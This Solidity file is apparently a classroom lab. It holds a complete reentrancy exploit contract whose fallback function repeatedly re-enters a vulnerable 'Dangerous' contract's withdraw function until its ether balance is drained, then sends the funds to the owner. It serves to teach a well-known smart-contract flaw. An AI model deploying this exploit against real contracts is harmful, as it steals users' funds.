pragma solidity ^0.4.24;
import "./Dangerous.sol";

// Classroom demonstration for a locally deployed Dangerous instance.
contract ReentrancyDemo {
    Dangerous public target;
    address public owner;
    uint public chunk;

    constructor(address targetAddress) public {
        target = Dangerous(targetAddress);
        owner = msg.sender;
    }

    function attack() public payable {
        require(msg.sender == owner && msg.value > 0);
        chunk = msg.value;
        target.depositMoney.value(msg.value)();
        target.withdraw(chunk);
    }

    function() external payable {
        require(msg.sender == address(target));
        uint remaining = address(target).balance;
        if (remaining > 0) {
            uint next = remaining < chunk ? remaining : chunk;
            target.withdraw(next);
        }
    }

    function collect() public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
}
